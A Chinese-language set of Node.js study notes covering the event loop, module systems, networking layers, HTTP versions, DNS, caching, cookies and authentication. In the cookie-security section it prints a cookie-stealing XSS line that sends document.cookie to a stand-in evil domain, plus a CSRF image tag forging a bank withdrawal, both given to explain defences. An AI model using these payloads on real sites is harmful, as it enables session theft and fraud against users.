# Node

<script setup>
import Image from "../components/Image/index.vue"
</script>

## 基础

Node.js 是异步事件驱动的单线程模型。
由于 Node.js 异步非阻塞的特性，因此适用于 I/O 密集型的应用场景。Node.js 是单线程模型，需要避免 CPU 的耗时操作。

### 版本管理

NVM

```md
https://nvm.uihtm.com/#google_vignette
```

## 事件循环

### 循环图

<Image  src="/node/images/event.png" />
<Image  src="/node/images/event-1.png" />

### 主线程

- 启动入口文件， 运行主函数
- eventLoop: 检查是否需要进入事件循环
  - 检查其他线程里是否还有待处理事项
  - 检查其他任务是否还在进行中（比如计时器、文件读取操作等任务是否完成）
  - 有以上情况，进入事件循环，运行其他任务
    事件循环的过程：沿着从 timers 到 close callbacks 这个流程，走一圈。到 event loop 看是否结束，没结束再走一圈。
- over：所有的事情都完毕，结束

### 事件循环

- **timers: 执行 setTimeout() 和 setInterval()中到期的 callback**
- pending callbacks: 执行延迟到下一个循环迭代的 I/O 回调
- idle, prepare: 仅系统内部使用
- **poll: 检索新的 I/O 事件;执行与 I/O 相关的回调（几乎所有情况下，除了 close 事件的 callback，那些关闭的回调会被 close callbacks 阶段执行）**
- **check: 执行 setImmediate()的 callback**
- close callbacks: 执行 close 事件的 callback，例如 socket.on('close')这种

### 核心周期

<Image  src="/node/images/event-2.png" />

## commonjs 解析

文件内的内容被包装成一个函数，并传入五个参数，exports, require, module, **filename, **dirname

```js
// 包装文件内容并返回可执行的函数：
/*
        (function (exports, require, module, __filename, __dirname) {
            file content...
        })
    */
```

- 模块导出的数据存放在 module.exports 对象中。
- exports 是 module.exports 的别名。
- 模块加载过一次后会进行缓存，第二次加载时直接返回上一次的缓存结果。
- Node.js 会检测出当前代码是否存在循环引用，并做相应的处理。

## 常用 API

### commonjs 模块对象

使用 CommonJS 规范的文件模块对象。

#### 特性

1. require：加载文件模块导出的对象。
2. module.exports：存储文件模块导出的对象。
3. \_\_dirname: 当前模块的文件夹路径。
4. \_\_filename: 当前模块的文件路径。
5. exports：模块导出对象，是 module.exports 的别名。
6. require.cache：存储已加载的模块的缓存对象。
7. require.main：主入口文件模块对象。
8. require.resolve：返回模块解析后的文件路径。

### ESM 模块

生效规则

1. 如果文件扩展名为.js。只有最近的 package.json 文件的 type 属性值为 module 时，Node.js 才会认为文件使用的是 ESM 规范的模块，其它情况都会认为采用的是 CommonJS 规范的模块。
2. 无论 type 字段的值如何，.mjs 文件始终被视为 ES 模块，.cjs 文件总是被视为 CommonJS 模块。

引用时不能省略扩展名

#### 特性

1. 直接在内置的模块中导出 API

```js
import { readFile } from "node:fs";
import { URL } from "node:url";
readFile(
  new URL("./foo.txt", import.meta.url),
  { encoding: "utf8" },
  (err, source) => {
    if (err) {
      console.error(err);
    } else {
      console.log(source);
    }
  }
);
```

2. import.meta
   包含 url 和 resolve 属性的对象。
3. import.meta.url
   返回当前文件的 url 路径，以 file://协议开头。

```js
// file:///app/index.mjs
console.log(import.meta.url);
```

4. import.meta.resolve

总结：ESM 和 CommonJS 的区别

1. ESM 没有 require、exports、module.exports。
2. ESM 没有**filename、**dirname。
3. ESM 没有 require.resolve，不过可以使用 import.meta.resolve。
4. ESM 没有 require.cache。

### Modules:node:module API

1. module.builtinModules
   Node.js 提供的所有模块的名称列表。可用于验证模块是否由第三方维护。

```js
const builtin = require("node:module").builtinModules;
```

2. module.createRequire(filename)
   创建 require 函数。filename 参数必须是 URL 对象、URL 字符串，或者是绝对路径。

```js
// sibling-module.js
module.exports = {
  name: "sibling-module",
};
// index.mjs
import { createRequire } from "node:module";
const require = createRequire(import.meta.url);

const siblingModule = require("./sibling-module");
console.log(siblingModule);
```

3. module.isBuiltin(moduleName)
   检测模块是否是内置模块。

```js
const isBuiltin = require("node:module").isBuiltin;
console.log(isBuiltin("node:path")); // true
console.log(isBuiltin("path")); // true
console.log(isBuiltin("wss")); // false
```

### URL 模块

URL 模块提供了一些非常实用的用于解析 URL 的方法

### Query 模块

Query String 模块提供了一些非常实用的用于解析查询字符串的方法。

### path 模块

Path 模块提供了用于处理文件和目录路径的实用程序

path.join()和 path.resolve()的区别
path.join 是用来连接路径片段，并返回规范化后的路径；而 path.resolve 将路径片段解析为绝对路径。

```js
// 例子1
// /bar/foo
console.log(path.join("/bar", "/foo"));
// /foo
console.log(path.resolve("/bar", "/foo"));

// 例子2：假如当前命令执行的目录是/home/myself/node（和代码文件所在的目录没有关系）
// bar/foo/
console.log(path.join("bar/", "foo/"));
// /home/myself/node/bar/foo
console.log(path.resolve("bar/", "foo/"));
```

### OS 模块

### File System 模块

### process 模块

### Events 模块

### Stream 模块

### HTTP 模块

## 网络详解

### OSI & TCP/IP 模型设计

#### OSI 七层模型

osi 七层模型是国际标准化组织（ISO）制定的一个用于计算机或通信系统间互联的标准体系。它将网络通信过程分为七个层次，每一层都有特定的功能和协议。OSI 模型的设计目的是为了提供一个通用的网络通信框架，使得不同厂商和不同技术的网络设备可以相互通信。

##### 应用层

- 功能是直接向用户提供服务，完成用户希望在网络上完成的各种工作
- 文件服务、目录服务、文件传输服务（FTP）、远程登录服务（Telnet）、电子邮件服务（E-mail）、打印服务、安全服务、网络管理服务、数据库服务、DNS 服务 etc
- 在应用层交互的数据单元称为报文
- 主要能力
  - 用户接口：应用层是用户与网络，以及应用程序与网络间的直接接口，使得用户能够与网络进行交互式联系
  - 实现各种服务：该层具有的各种应用程序可以完成和实现用户请求的各种服务

##### 表示层

- 对来自应用层的命令和数据进行解释，对各种语法赋予相应的含义，并按照一定的格式传送给会话层。其主要功能是“处理用户信息的表示问题，如编码、数据格式转换和加密解密”
- 主要能力
  - 数据格式处理：协商和建立数据交换的格式，解决各应用程序之间在数据格式表示上的差异
  - 数据的编码：处理字符集和数字的转换。例如由于用户程序中的数据类型（整型或实型、有符号或无符号等）、用户标识等都可以有不同的表示方式，因此，在设备之间需要具有在不同字符集或格式之间转换的功能
  - 压缩和解压缩：为了减少数据的传输量，这一层还负责数据的压缩与恢复
  - 数据的加密和解密：可以提高网络的安全性

##### 会话层

- 向两个实体的表示层提供建立和使用连接的方法。将不同实体之间的表示层的连接称为会话。因此会话层的任务就是组织和协调两个会话进程之间的通信，并对数据交换进行管理
- 主要能力
  - 会话管理：允许用户在两个实体设备之间建立、维持和终止会话，并支持它们之间的数据交换。
  - 会话流量控制：提供会话流量控制和交叉会话功能
  - 寻址：使用远程地址建立会话连接。
  - 出错控制：从逻辑上讲会话层主要负责数据交换的建立、保持和终止，但实际的工作却是接收来自传输层的数据，并负责纠正错误。会话控制和远程过程调用均属于这一层的功能。但应注意，此层检查的错误不是通信介质的错误，而是磁盘空间、打印机缺纸等类型的高级错误。

##### 传输层

- 以下三层：数据通信，以上三层：数据处理，是通信子网和资源子网的接口和桥梁，起到承上启下的作用
- 向用户提供可靠的端到端的差错和流量控制，保证报文的正确传输，向高层屏蔽下层数据通信的细节，即向用户透明地传送报文，常见的协议：TCP、UDP
- 主要能力
  - 传输连接管理，在网络层的基础上为高层提供“面向连接”和“面向无接连”的两种服务
  - 处理传输差错。提供可靠的“面向连接”和不太可靠的“面向无连接”的数据传输服务、差错控制和流量控制。在提供“面向连接”服务时，通过这一层传输的数据将由目标设备确认，如果在指定的时间内未收到确认信息，数据将被重发
  - 监控服务质量

##### 网络层

- 负责数据包从源端到目的端的路由选择和转发。IP 协议工作在这一层。
- 通过路由选择算法，为报文或分组通过通信子网选择最适当的路径
- 数据链路层的数据在这一层被转换为数据包，然后通过路径选择、分段组合、顺序、进/出路由等控制，将信息从一个网络设备传送到另一个网络设备
- 主要能力
  - 寻址：数据链路层中使用的物理地址（如 MAC 地址）仅解决网络内部的寻址问题。在不同子网之间通信时，为了识别和找到网络中的设备，每一子网中的设备都会被分配一个唯一的地址。由于各子网使用的物理技术可能不同，因此这个地址应当是逻辑地址（如 IP 地址）
  - 交换：规定不同的信息交换方式。常见的交换技术有：线路交换技术和存储转发技术，后者又包括报文交换技术和分组交换技术
  - 路由算法：当源节点和目的节点之间存在多条路径时，本层可以根据路由算法，通过网络为数据分组选择最佳路径，并将信息从最合适的路径由发送端传送到接收端
  - 连接服务：与数据链路层流量控制不同的是，前者控制的是网络相邻节点间的流量，后者控制的是从源节点到目的节点间的流量。其目的在于防止阻塞，并进行差错检测。

##### 数据链路层

数据链路层：（Data Link Layer）

- 负责建立和管理节点间的链路
- 通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路
- 接受物理层的数据，封装成帧传给上层，接受上层数据解析成比特数据换发给物理层

##### 物理层

- 实现计算机节点之间比特流的透明传送
- 物理层的主要任务描述为确定与传输媒体的接口的一些特性，提供用于建立、保持和断开物理连接的机械的、电气的、功能的和过程的条件，也就是说物理层提供有关同步和比特流在物理媒体上的传输手段。
- 是物理硬件上的底层能力，比如光缆、电缆等设备连接形成组网
- 包括信号的调制及信道复用等

#### TCP/IP 协议

<Image  src="/node/images/tcp-ip.png" />

- 应用层
  - 大多数普通与网络相关的程序为了通过网络与其他程序通信所使用的层。这个层的处理过程是应用特有的；数据从网络相关的程序以这种应用内部使用的格式进行传送，然后被编码成标准协议的格式； `HTTP数据`
  - 应用层负责处理特定的应用程序细节。包括 Telnet（远程登录）、FTP（文件传输协议）、SMTP（简单邮件传送协议）以及 SNMP（简单网络管理协议）等；
- 传输层 `HTTP数据 + TCP首部`
  - 两台主机上的应用程序提供端到端的通信，有 2 种传输协议：TCP（传输控制协议）和 UDP（用户数据报协议）；
- 网络层 `HTTP数据 + TCP首部 + IP首部`
  - 处理分组在网络中的活动，例如分组的选路。网络层协议包括 IP 协议（网际协议）、ICMP 协议（Internet 互联网控制报文协议），以及 IGMP 协议（Internet 组管理协议）；
- 网络接口层 `HTTP数据 + TCP首部 + IP首部+ 以太网首部`
  - 也称作数据链路层，包括操作系统中的设备驱动程序和计算机中对应的网络接口卡。一起处理与电缆（或其他任何传输媒介）的物理接口细节；

#### 每层加工

<Image  src="/node/images/tcp-ip-1.png" />

### TCP 和 UDP

#### 区别

- TCP（Transmission Control Protocol），传输控制协议，是一种可靠、面向字节流的通信协议，把上面应用层交下来的数据看成无结构的字节流来发送，需要 20 个字节
  <Image  src="/node/images/tcp.png" />
- UDP（User Datagram Protocol），用户数据包协议，是一个简单的面向数据报的通信协议，只是在其上面加上首部后就交给了下面的网络层，只占用 8 个字节（64bit）

  <Image  src="/node/images/udp.png" />

#### TCP

- 三次握手
  <Image  src="/node/images/tcp-open.png" />
- 四次挥手
  <Image  src="/node/images/tcp-close.png" />

TCP 提供可靠的链接， 链接是需要通过 3 次握手来建立， 关闭需要 4 次挥手关闭连接

#### TCP 三次握手

> `SYN`: synchronize 用于建立连接时同步序列号
> `ACK`: acknowledge 确认收到某个序列号
> `FIN`: Finish，表示发送端已经没有数据发送
> `seq`: Sequence Number，数据包的序列号
> `ack`: Acknowledgment Number，期望收到的下一个序列号

所谓的三次握手就是指建立连接时，客户端和服务器总共发送 3 个报文

1.  第一步

- 客户端发送 SYN=1（同步标志位为 1），表示请求建立连接。
- 随机选择一个初始序列号 seq=x。
- 状态变为 SYN_SENT

2. 第二步

- 服务端收到 SYN 后，回应一个 SYN=1 和 ACK=1（确认标志位为 1）
- 服务端也选择一个初始序列号 seq=y，并确认客户端的序号 ack=x+1
- 状态变为 SYN_RCVD

3. 第三步

- 客户端发送 ACK=1 给服务端，确认服务端的 seq=y，即 ack=y+1
- 双方连接建立成功，可以开始通信

```md
Client Server
| |
| SYN=1, seq=x |
|------------------>|
| |
| SYN=1, ACK=1 |
| seq=y, ack=x+1 |
|<------------------|
| |
| ACK=1 seq=x+1 ack=y+1 |
|------------------>|
|
[连接已建立]
```

#### TCP 四次挥手

> 四次挥手之指 TCP 连接的断开需要客户端和服务器总共发送 4 个报文

1. 第一次挥手：

- 客户端发送 FIN=1（结束标志位为 1），表示没有更多数据要发送。
- 状态变为 FIN-WAIT-1。

2. 第二次挥手：

- 服务端收到 FIN 后，发送 ACK=1 确认，并确认序号为 ack=x+1。
- 服务端进入 CLOSE-WAIT 状态；客户端进入 FIN-WAIT-2。

3. 第三次挥手：

- 服务端处理完剩余数据后，发送自己的 FIN=1。
- 状态变为 LAST-ACK（服务端）。

4. 第四次挥手：

- 客户端发送 ACK=1 确认服务端的 FIN，并设置 ack=z+1。
- 客户端进入 TIME-WAIT 状态，等待 2MSL（Maximum Segment Lifetime）时间后正式关闭连接。

```md
Client Server
| |
| FIN=1 seq=p |
|------------------>|
| |
| ACK=1 ack=p+1 |
|<------------------|
| |
| FIN=1 ACK=1 seq =q ack=p+1 |
|<------------------|
| |
| ACK=1 ack = q+1 |
|------------------>|
|
[连接已关闭]
```

### HTTP

HTTP 是一个 client-server 协议：请求通过一个实体被发出，实体也就是用户代理。大多数情况下，这个用户代理都是指浏览器，当然它也可能是任何东西，比如一个爬取网页生成维护搜索引擎索引的机器爬虫。它是一个无状态，无会话的

#### 状态码

- 1XX: 100 continue 101 http ->websocket 请求服务器切换更高的协议
- 2XX: 200 ok 204 只有响应头无 body 206: partial content HTTP1.1 断点续传、分块下载
- 3XX：301 永久重定向 302 暂时重定向 304 缓存
- 4XX：400 bad request 通用 403 禁止访问 404 无资源 405 method not allowed
- 5XX: 500 服务器错误 501 不支持客户端请求 502 bad gateway 代理服务器异常 503 太多，无法响应

#### http 攻击

SQL：

- 通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中
- 处理：对用户的输入进行转义
  XSS：（Cross-site scripting）
- 存储型 XSS
  - 注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。
- 反射型 XSS
  - 当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web 服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自"可信任"的服务器，所以会执行这段脚本。
- 基于 DOM 的 XSS
  - 通过修改原始的客户端代码，受害者浏览器的 DOM 环境改变，导致有效载荷的执行。也就是说，页面本身并没有变化，但由于 DOM 环境被恶意修改，有客户端代码被包含进了页面，并且意外执行。
- 处理：对用户的输入进行转义
  CSRF：（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。
- 一个典型的 CSRF 攻击有着如下的流程：
  - 受害者登录 a.com，并保留了登录凭证（Cookie）。
  - 攻击者引诱受害者访问了 b.com。
  - b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带 a.com 的 Cookie。
  - a.com 接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。
  - a.com 以受害者的名义执行了 act=xx。
  - 攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让 a.com 执行了自己定义的操作。
- 处理：cookie samesite

### HTTP1.0 & HTTP1.1 & HTTP2 & HTTP3

#### HTTP1.0

1. 1.0 规定浏览器和服务器保持短暂的连接。浏览器的每次请求都需要与服务器建立一个 TCP 连接，服务器处理完成后立即断开 TCP 连接（无连接），服务器不跟踪每个客户端也不记录过去的请求（无状态）
1. 无状态，使用 cookie
1. 无法复用连接。每次发送请求的时候，都需要进行一次 TCP 连接，而 TCP 的连接释放过程又是比较费事的。这种无连接的特性会导致网络的利用率非常低。
1. 队头堵塞(head of line blocking)。由于 HTTP/1.0 规定下一个请求必须在前一个请求响应到达之前才能发送。假设一个请求响应一直不到达，那么下一个请求就不发送，就到导致阻塞后面的请求。
1. 支持方法：GET POST HEAD

#### HTTP1.1

1. 持久连接
1. 引入了持久连接，即 TCP 连接默认不关闭，可以被多个请求复用，不用声明 Connection: keep-alive(对于同一个域名，大多数浏览器允许同时建立 6 个持久连接)
1. 管道机制
1. 即在同一个 TCP 连接里面，客户端可以同时发送多个请求。
1. 分块传输编码
1. 即服务端每产生一块数据，就发送一块，采用”流模式”而取代”缓存模式”。
1. 新增请求方式
1. PUT:请求服务器存储一个资源;
1. DELETE：请求服务器删除标识的资源；
1. OPTIONS：请求查询服务器的性能，或者查询与资源相关的选项和需求；
1. TRACE：请求服务器回送收到的请求信息，主要用于测试或诊断；
1. CONNECT：保留将来使用
1. 缺点：
1. 虽然允许复用 TCP 连接，但是同一个 TCP 连接里面，所有的数据通信是按次序进行的。服务器只有处理完一个请求，才会接着处理下一个请求。如果前面的处理特别慢，后面就会有许多请求排队等着。这将导致“队头堵塞”
1. 避免方式：一是减少请求数，二是同时多开持久连接

#### HTTP2

1. 二进制协议
2. HTTP/1.1 版的头信息肯定是文本（ASCII 编码），数据体可以是文本，也可以是二进制。HTTP/2 则是一个彻底的二进制协议，头信息和数据体都是二进制，并且统称为”帧”：头信息帧和数据帧。
3. 二进制协议解析起来更高效、“线上”更紧凑，更重要的是错误更少。
4. **完全多路复用**
5. **HTTP/2 复用 TCP 连接，在一个连接里，客户端和浏览器都可以同时发送多个请求或回应，而且不用按照顺序一一对应，这样就避免了”队头堵塞”。**
6. 报头压缩
7. HTTP 协议是没有状态，导致每次请求都必须附上所有信息。所以，请求的很多头字段都是重复的，比如 Cookie，一样的内容每次请求都必须附带，这会浪费很多带宽，也影响速度
8. 对于相同的头部，不必再通过请求发送，只需发送一次；
9. HTTP/2 对这一点做了优化，引入了头信息压缩机制；
10. 一方面，头信息使用 gzip 或 compress 压缩后再发送；
11. 另一方面，客户端和服务器同时维护一张头信息表，所有字段都会存入这个表，产生一个索引号，之后就不发送同样字段了，只需发送索引号。
12. 服务器推送
13. HTTP/2 允许服务器未经请求，主动向客户端发送资源；
14. 通过推送那些服务器任务客户端将会需要的内容到客户端的缓存中，避免往返的延迟

#### HTTP3
 QUIC 协议，基于 UDP，支持多路复用，减少 TCP 连接的建立和关闭次数，支持快速重传，减少丢包重传次数，支持快速恢复，减少连接中断次数

### DNS

1. DNS：将主机名转为具体 IP 的服务
   根域：就是一个“.”号，由 Internet 名字注册授权机构管理。全世界共有 13 台根域服务器。
   顶级域：由 Internet 名字授权机构管理。共有 3 种类型的顶级域：
   组织域：采用 3 个字符的代号，如 edu、com、gov 等。
   地理域：采用 2 个字符的国家/地区代号，如 cn、jp、hk 等。
   反向域：这是一个特殊域，名称为 in-addr.arpa，用于将 IP 映射到域名。
   二级域：注册到个人、组织或公司的名称。二级域下还可以创建子域。
   主机名：就是 FQDN 最左边的部分。使用“hostname”命令可以显示当前主机名。
2. 操作过程：递归查询，优先查找是否有 DNS 缓存
   <Image  src="/node/images/dns.png" />

## 缓存 安全与鉴权

### Cookie

HTTP Cookie（通常也叫 Web Cookie 或浏览器 Cookie），是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。支持无状态的 HTTP 变为“有状态”

- `Set-Cookie`
- Cookie 的生命周期
  - 会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期 Cookie 不需要指定过期时间（Expires）或者有效期（Max-Age）；
  - 持久性 Cookie：生命周期取决于过期时间（Expires）或有效期（Max-Age）
- Cookie 的安全性
  - HttpOnly：标志的 Cookie 仅能通过 HTTP 协议访问，不能通过 JavaScript 访问，减少 XSS 攻击。
  - Secure：标志的 Cookie 仅能通过 HTTPS 协议发送给服务器，减少中间人攻击。
  - SameSite：限制第三方 Cookie，防止 CSRF 攻击。
- Cookie 的作用域
  - Domain 指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。
    例如，如果设置 Domain=chenghuai.com，则 Cookie 也包含在子域名中（如 dev.chenghuai.com）
  - Path 指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 %x2F ("/") 作为路径分隔符，子路径也会被匹配。
- SameSite
  SameSite Cookie 允许服务器要求某个 cookie 在跨站请求时不会被发送，从而可以阻止（CSRF）
  1. None：浏览器会在同站请求、跨站请求下继续发送 cookies，不区分大小写；
  2. Strict：浏览器将只在访问相同站点时发送 cookie；
  3. Lax：与 Strict 类似，但用户从外部站点导航至 URL 时（例如通过链接）除外。 在新版本浏览器中，为默认选项，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者 frames 的调用，但只有当用户从外部站点导航到 URL 时才会发送。如 link 链接；
- 安全性
  减少 Cookie 的攻击的方法：

  1. 使用 HttpOnly 属性可防止通过 JavaScript 访问 cookie 值；
  2. 用于敏感信息（例如指示身份验证）的 Cookie 的生存期应较短，并且 SameSite 属性设置为 Strict 或 Lax；
     xss:在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。

  ```js
  new Image().src =
    "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
  ```

  CSRF

  ```js
  <img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
  ```

### Node 缓存

#### 缓存作用

1. 为了提高速度，提高效率；
2. 减少数据传输，节省网费；
3. 减少服务器的负担，提高网站性能；
4. 加快客户端加载网页的速度；

#### 缓存类型

##### 强制缓存

强制缓存不需要与服务器发生交互。

- 缓存
  1. 缓存命中 客户端请求数据，现在本地的缓存数据库中查找，如果本地缓存数据库中有该数据，且该数据没有失效。则取缓存数据库中的该数据返回给客户端；
  2. 缓存未命中 客户端请求数据，现在本地的缓存数据库中查找，如果本地缓存数据库中有该数据，且该数据失效。则向服务器请求该数据，此时服务器返回该数据和该数据的缓存规则返回给客户端，客户端收到该数据和缓存规则后，一起放到本地的缓存数据库中留存。以备下次使用；
- Expires
  这是 HTTP 1.0 的字段，表示缓存到期时间，是一个绝对的时间 (当前时间+缓存时间)。在响应消息头中，设置这个字段之后，就可以告诉浏览器，在未过期之前不需要再次请求。
  比如：Expires: Thu, 22 Mar 2029 16:06:42 GMT
  缺点：若修改电脑的本地时间，会导致浏览器判断缓存失效 这里修重新修改缓存
- Cache-control
  在得知 Expires 的缺点之后，在 HTTP/1.1 中，增加了一个字段 Cache-control，该字段表示资源缓存的最大有效时间，在该时间内，客户端不需要向服务器发送请求

  Q： Expires 和 Cache-control 区别是什么？

  1. Expires 设置的是 绝对时间 Cache-control 设置的是 相对时间；
  2. Cache-control 优先级大于 Expires
     Cache-control: max-age=20 // 表示有效时间为 20s
     res.setHeader('Cache-control', 'no-store')
     res.setHeader('Cache-control', 'max-age=20')

  cache-control 设置：

  1. no-cache：告诉浏览器忽略资源的缓存副本，强制每次请求直接发送给服务器，拉取资源，但不是“不缓存”，相当于需要使用协商缓存，禁止使用强制缓存；
  2. no-store：强制缓存在任何情况下都不要保留任何副本，相当于不使用强制缓存和协商缓存；
  3. public 任何路径的缓存者（本地缓存、代理服务器），可以无条件的缓存改资源，不设置默认为 public；
  4. private 只针对单个用户或者实体（不同用户、窗口）缓存资源；

##### 协商缓存

当强制缓存失效(超过规定时间)时，就需要使用对比缓存，由服务器决定缓存内容是否失效。对比缓存是可以和强制缓存一起使用。

- last-modified

  1. 服务器在响应头中设置 last-modified 字段返回给客户端，告诉客户端资源最后一次修改的时间；
  1. Last-Modified: Sat, 30 Mar 2029 05:46:11 GMT
  1. 浏览器在这个值和内容记录在浏览器的缓存数据库中；
  1. 下次请求相同资源，浏览器将在请求头中设置 if-modified-since 的值（这个值就是第一步响应头中的 Last-Modified 的值）传给服务器；
  1. 服务器收到请求头的 if-modified-since 的值与 last-modified 的值比较，如果相等，表示未进行修改，则返回状态码为 304；如果不相等，则修改了，返回状态码为 200，并返回数据；
     缺点：
  1. last-modified 是以秒为单位的，假如资料在 1s 内可能修改几次，那么该缓存就不能被使用的；
  1. 如果文件是通过服务器动态生成，那么更新的时间永远就是生成的时间，尽管文件可能没有变化，所以起不到缓存的作用；

- Etag
  Etag 是根据文件内容，算出一个唯一的值。服务器存储着文件的 Etag 字段。
  之后的流程和 Last-Modified 一致，只是 Last-Modified 字段和它所表示的更新时间改变成了 Etag 字段和它所表示的文件 hash，把 If-Modified-Since 变成了 If-None-Match。
  服务器同样进行比较，命中返回 304, 不命中返回新资源和 200。 Etag 的优先级高于 Last-Modified

      缺点：

1. 每次请求的时候，服务器都会把文件读取一次，以确认文件有没有修改；
2. 大文件进行 etag 一般用文件的大小 + 文件的最后修改时间 来组合生成这个 etag；

### 鉴权

目前常用的鉴权有四种：

- HTTP Basic Authentication
- session-cookie
- Token 验证
- OAuth(开放授权)

#### HTTP Basic Authentication

这种授权方式是浏览器遵守 http 协议实现的基本授权方式，HTTP 协议进行通信的过程中，HTTP 协议定义了基本认证允许 HTTP 服务器对客户端进行用户身份证的方法

#### session-cookie

##### cookie

Http 协议是一个无状态的协议，服务器不会知道到底是哪一台浏览器访问了它，因此需要一个标识用来让服务器区分不同的浏览器。cookie 就是这个管理服务器与客户端之间状态的标识。

1. 浏览器第一次向服务器发送请求，服务器在 response 头部设置 Set-Cookie 字段；
2. 浏览器客户端收到响应就会设置 cookie 并存储；
3. 在下一次该浏览器向服务器发送请求时，就会在 request 头部自动带上 Cookie 字段，服务器端收到该 cookie 用以区分不同的浏览器；

##### session

session 是会话的意思，浏览器第一次访问服务端，服务端就会创建一次会话，在会话中保存标识该浏览器的信息。它与 cookie 的区别就是 session 是缓存在服务端的，cookie 则是缓存在客户端，他们都由服务端生成，为了弥补 Http 协议无状态的缺陷。

##### cookie -session 认证


#### token 验证
token 是一个令牌，浏览器第一次访问服务端时会签发一张令牌，之后浏览器每次携带这张令牌访问服务端就会认证该令牌是否有效，只要服务端可以解密该令牌，就说明请求是合法的，令牌中包含的用户信息还可以区分不同身份的用户


#### JWT
服务器认证以后，生成一个 JSON 对象，这个 JSON 对象肯定不能裸传给用户，那谁都可以篡改这个对象发送请求。因此这个 JSON 对象会被服务器端签名加密后返回给用户，返回的内容就是一张令牌，以后用户每次访问服务器端就带着这张令牌。


## node 框架


### express
### koa

### 区别
- 架构风格
  - Express： 功能丰富型框架
  - Koa： 轻量级框架
- 异步处理方式
  - Express： 回调函数
  - Koa： Generator + co
  - Koa2： async/await
- 中间件机制
  - Express： 中间件函数
  - Koa： 中间件类
- 路由机制
  - Express： 内置路由
  - Koa： koa-router

## 引用

<a href="https://nwy3y7fy8w5.feishu.cn/docx/DAfudQaMDoDo0FxN70gcdZAan5P" target="_blank"  style="display: block">node 基础</a>

<a href="https://nwy3y7fy8w5.feishu.cn/docx/ECrNdLVbvop7ITxyvTlctaGJnuc" target="_blank"  style="display: block">网络详解</a>

<a href="https://nwy3y7fy8w5.feishu.cn/docx/EG8idTDoqo1cgExeovwcC3Y5n0c" target="_blank"  style="display: block">Node 缓存 安全 鉴权</a>

<a href="https://x1mnl9knbjp.feishu.cn/docx/UKaldhN5loKq5LxRm3lcSAuTnze" target="_blank"  style="display: block">Express&Koa</a>


